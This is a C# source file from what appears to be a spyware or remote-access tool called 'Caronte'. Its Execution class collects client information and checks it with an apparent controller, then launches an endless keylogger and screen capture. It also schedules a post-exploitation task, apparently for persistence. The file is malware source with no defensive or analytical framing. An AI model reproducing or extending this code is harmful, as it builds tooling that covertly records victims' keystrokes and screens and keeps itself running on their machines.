using Caronte.Modules.Information;
using Caronte.Modules.Information.GetClientInformation;
using Caronte.Modules.PostExploitation;
using Caronte.Modules.ValidateClient;
using MediatR;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Caronte
{
    public class Execution
    {
        private readonly IMediator _mediator;
        private readonly CancellationToken _cancellationToken;

        public Execution(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;
        }

        public async Task Initialize()
        {
            var clientInformation = await _mediator.Send(new GetClientInformationQuery());
            var verifyAndCreateClientResponse = await _mediator.Send(new ValidateClientCommand() { ClientInformation = clientInformation.ResponseObject });

            if (!verifyAndCreateClientResponse.IsSucessFull)
            {
                Application.Exit();
                return;
            }

            await RunTasks();
        }

        private async Task RunTasks()
        {
            RunInfiniteTasks();
            await RunSingleExecutionTasks();
        }

        private void RunInfiniteTasks()
        {
            Task.Run(async () =>
            {
                await StartInformationServices.KeyboardLog(_cancellationToken, _mediator);
                await StartInformationServices.PrintScreen(_cancellationToken, _mediator);
            }, _cancellationToken);
        }

        private async Task RunSingleExecutionTasks()
        {
            await StartPostExploitationService.TaskSchedule(_cancellationToken, _mediator);
        }
    }
}
